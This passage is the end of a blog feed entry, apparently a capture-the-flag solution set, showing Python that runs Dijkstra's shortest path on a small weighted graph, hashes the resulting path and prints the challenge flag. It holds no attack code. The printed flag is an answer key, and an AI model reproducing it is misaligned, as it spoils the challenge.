class="string">for</span> <span class="string">node</span> <span class="string">in</span> <span class="string">graph</span>&#125;</span><br><span class="line">    <span class="string">distances[start]</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line">    <span class="string">paths</span> <span class="string">=</span> &#123;<span class="attr">start:</span> []&#125;</span><br><span class="line"></span><br><span class="line">    <span class="attr">while heap:</span></span><br><span class="line">        <span class="string">(dist,</span> <span class="string">current)</span> <span class="string">=</span> <span class="string">heapq.heappop(heap)</span></span><br><span class="line">        <span class="string">if</span> <span class="string">dist</span> <span class="string">&gt;</span> <span class="string">distances[current]:</span></span><br><span class="line">            <span class="string">continue</span></span><br><span class="line">        <span class="string">for</span> <span class="string">neighbor,</span> <span class="string">neighbor_dist</span> <span class="string">in</span> <span class="string">graph[current].items():</span></span><br><span class="line">            <span class="string">old_dist</span> <span class="string">=</span> <span class="string">distances[neighbor]</span></span><br><span class="line">            <span class="string">new_dist</span> <span class="string">=</span> <span class="string">dist</span> <span class="string">+</span> <span class="string">neighbor_dist</span></span><br><span class="line">            <span class="string">if</span> <span class="string">new_dist</span> <span class="string">&lt;</span> <span class="attr">old_dist:</span></span><br><span class="line">                <span class="string">distances[neighbor]</span> <span class="string">=</span> <span class="string">new_dist</span></span><br><span class="line">                <span class="string">paths[neighbor]</span> <span class="string">=</span> <span class="string">paths[current]</span> <span class="string">+</span> [<span class="string">neighbor</span>]</span><br><span class="line">                <span class="string">heapq.heappush(heap,</span> <span class="string">(new_dist,</span> <span class="string">neighbor))</span></span><br><span class="line">    <span class="string">return</span> <span class="string">distances[end],</span> <span class="string">paths[end]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义图的边和权重</span></span><br><span class="line"><span class="string">graph</span> <span class="string">=</span> &#123;</span><br><span class="line">    <span class="attr">1:</span> &#123;<span class="attr">2:</span> <span class="number">2</span>, <span class="attr">3:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">2:</span> &#123;<span class="attr">3:</span> <span class="number">5</span>, <span class="attr">4:</span> <span class="number">3</span>, <span class="attr">10:</span> <span class="number">20</span>&#125;,</span><br><span class="line">    <span class="attr">3:</span> &#123;<span class="attr">5:</span> <span class="number">6</span>, <span class="attr">8:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">4:</span> &#123;<span class="attr">5:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">5:</span> &#123;<span class="attr">9:</span> <span class="number">4</span>, <span class="attr">8:</span> <span class="number">1</span>&#125;,</span><br><span class="line">    <span class="attr">6:</span> &#123;<span class="attr">7:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">7:</span> &#123;<span class="attr">14:</span> <span class="number">6</span>&#125;,</span><br><span class="line">    <span class="attr">8:</span> &#123;<span class="attr">11:</span> <span class="number">5</span>, <span class="attr">15:</span> <span class="number">21</span>&#125;,</span><br><span class="line">    <span class="attr">9:</span> &#123;<span class="attr">12:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">10:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">11:</span> &#123;<span class="attr">15:</span> <span class="number">13</span>&#125;,</span><br><span class="line">    <span class="attr">12:</span> &#123;<span class="attr">15:</span> <span class="number">9</span>&#125;,</span><br><span class="line">    <span class="attr">14:</span> &#123;<span class="attr">15:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">15:</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行Dijkstra算法</span></span><br><span class="line"><span class="string">distance,</span> <span class="string">path</span> <span class="string">=</span> <span class="string">dijkstra(graph,</span> <span class="number">1</span><span class="string">,</span> <span class="number">15</span><span class="string">)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">print(f&quot;最短距离:</span> &#123;<span class="string">distance</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">print(f&quot;</span><span class="string">路径:</span> &#123;<span class="string">&#x27; -&gt; &#x27;</span><span class="string">.join(map(str</span>, <span class="string">path))</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">pmd5(&quot;</span><span class="number">1381115</span><span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">4991</span>ce1781b53409a7a84e2baf9431d6&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">真的感觉质量低，没写的别写QAQ</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
